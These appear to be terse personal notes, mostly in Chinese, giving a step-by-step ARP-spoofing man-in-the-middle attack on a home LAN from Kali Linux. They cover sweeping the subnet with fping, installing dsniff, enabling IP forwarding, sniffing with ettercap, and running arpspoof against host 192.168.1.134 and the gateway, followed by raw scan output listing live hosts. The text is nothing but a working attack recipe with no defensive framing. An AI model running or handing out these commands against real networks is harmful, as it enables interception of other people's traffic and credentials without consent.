* fping -g 192.168.1.6/24
* 先输入命令更新一下系统：
* apt-get update，接着输入命令下载安装arpspoof程序：
* apt-get install dsniff；然后查看是否下载成功输入命
* echo 1 > /proc/sys/net/ipv4/ip_forward kali 开启转发
* ettercap
     1. -Tq -i eth0 开启嗅探
     2. ettercap -G 客户端


* arpspoof -i eth0 -t 192.168.1.134 192.168.1.1


## 扫描局域网ip
192.168.1.1 is alive
192.168.1.15 is alive
192.168.1.25 is alive
192.168.1.14 is alive
192.168.1.18 is alive
192.168.1.37 is alive
192.168.1.24 is alive
192.168.1.23 is alive
192.168.1.32 is alive
192.168.1.87 is alive
192.168.1.87 : duplicate for [0], 64 bytes, 22.3 ms
192.168.1.91 is alive
192.168.1.91 : duplicate for [0], 64 bytes, 180 ms
192.168.1.115 is alive
192.168.1.134 is alive
192.168.1.73 is alive
192.168.1.73 : duplicate for [0], 64 bytes, 346 ms


